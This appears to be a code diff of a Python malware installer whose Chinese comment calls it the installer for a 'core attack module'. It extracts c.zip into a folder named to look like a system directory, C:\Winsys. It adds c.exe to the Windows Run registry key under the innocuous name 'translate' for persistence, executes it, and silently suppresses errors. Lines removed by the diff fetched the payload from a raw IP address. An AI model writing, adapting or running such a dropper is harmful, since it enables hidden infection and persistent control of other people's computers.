@@ -1,9 +1,14 @@
-from urllib import request
 import os
 import zipfile
 import win32api
 import win32con
 import time
+import shutil
+
+'''
+此程序用于安装核心攻击模块并进行基础的安装设置
+此程序工作目录设置为Winsys
+'''
 
 def remove_dir(dir):
 	#用于删除路径的函数
@@ -20,7 +25,7 @@ def remove_dir(dir):
 
 def add():
 	name = 'translate'  # 要添加的项值名称
-	path = r'C:\sys_file\center\windows\c.exe'  # 要添加的exe路径
+	path = r'C:\Winsys\center\windows\c.exe'  # 要添加的exe路径
 	# 注册表项名
 	KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
 	# 异常处理
@@ -30,23 +35,26 @@ def add():
 	win32api.RegCloseKey(key)
 
 
-if __name__=='__main__':
+def mainKillCoreInstall():
 	try:
-		remove_dir(r"C:\sys_file")
+		remove_dir(r"C:\Winsys")
 	except:
 		pass
 
-	os.makedirs(r"C:\sys_file\center\windows")
+	os.makedirs(r"C:\Winsys\center\windows")
 
-	request.urlretrieve("http://104.155.212.130/c.zip",r"C:\sys_file\center\windows\c.zip")
-	azip = zipfile.ZipFile(r"C:\sys_file\center\windows\c.zip")
+	shutil.copyfile(r"\c.zip",r"C:\Winsys\center\windows\c.zip")
+
+	azip = zipfile.ZipFile(r"C:\Winsys\center\windows\c.zip")
 	#解压到原始目录
-	azip.extractall(r"C:\sys_file\center\windows")
+	azip.extractall(r"C:\Winsys\center\windows")
 	
 	try:
 		time.sleep(2)
 		add()
 	except:
-		print("ok")
+		pass
 
-	os.system(r"C:\sys_file\center\windows\c.exe")
+	os.system(r"C:\Winsys\center\windows\c.exe")
+
+
